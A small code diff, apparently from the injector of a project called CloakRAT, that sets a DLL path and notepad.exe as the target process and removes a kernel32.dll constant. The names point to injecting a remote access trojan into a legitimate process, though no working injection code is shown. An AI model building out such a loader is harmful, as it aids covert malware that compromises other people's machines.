@@ -6,7 +6,6 @@
 
 #define DLL_PATH "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll"
 #define TARGET_EXE "notepad.exe"
-#define KERNEL32_STR "kernel32.dll"
 
 int main(int argc, char** argv)
 {
